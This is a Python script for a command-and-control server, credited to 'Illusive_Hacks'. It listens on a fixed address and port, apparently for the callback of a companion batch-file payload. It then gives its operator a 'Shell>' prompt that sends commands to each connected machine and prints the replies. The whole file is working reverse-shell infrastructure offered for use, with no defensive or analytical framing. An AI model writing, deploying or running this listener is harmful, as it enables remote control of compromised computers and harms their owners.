import socket

HOST = '192.168.10.134'  # Listen on all interfaces
PORT = 8888  # The port you specified in the batch file

def handle_client(client_socket):
    print(f"Connection from {client_socket.getpeername()}")
    while True:
        try:
            command = input("Shell> ")
            if command.lower() == 'exit':
                client_socket.sendall(b'exit')
                break
            if command.strip():
                client_socket.sendall(command.encode('utf-8') + b'\n')
                response = client_socket.recv(4096).decode('utf-8')
                print(response)
        except Exception as e:
            print(f"Error: {e}")
            break

    client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)

    # Banner
    print("""
    **************************************
    *       Welcome to My C&C Server     *
    *                  by                *
    *             Illusive_Hacks         *
    **************************************
    """)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        handle_client(client_socket)

if __name__ == "__main__":
    main()

